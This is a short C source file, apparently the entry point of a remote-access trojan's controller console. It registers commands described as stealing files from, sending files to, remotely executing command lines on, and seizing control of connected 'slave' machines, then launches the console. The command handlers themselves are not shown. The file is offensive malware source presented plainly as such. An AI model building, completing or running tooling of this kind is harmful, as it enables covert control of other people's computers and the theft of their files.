#include "Master.h"

CmdInfo rf = {
	recv_file,
	"rf",
	"usage: rf (src_path, dsc_path) | steal src_path file and store it at dsc_path"
};
CmdInfo sf = {
	send_file,
	"sf",
	"usage: sf (src_path, dsc_path) | send src_path file and store it at dsc_path"
};
CmdInfo excmd = {
	execute_cmd,
	"cmd",
	"usage: cmd (command line) | remote execute command line."
};
CmdInfo ct = {
	connect_server,
	"ct",
	"usage: ct (ip) (port) | connect to server."
};
CmdInfo sc = {
	seize_control,
	"sc",
	"usage: sc (index) | seize control of index slave."
};
CmdInfo ls = {
	list_slaves,
	"ls",
	"useage: ls | list slaves."
};
CmdInfo status = {
	show_status,
	"status",
	"usage: status | show current status."
};

CMD_MAP_BEGIN(cmd_map)
CMD_MAP(default_help)
CMD_MAP(status)
CMD_MAP(ls)
CMD_MAP(ct)
CMD_MAP(excmd)
CMD_MAP(rf)
CMD_MAP(sf)
CMD_MAP(sc)
CMD_MAP_END()

int main()
{
	return Console(cmd_map).main();
}
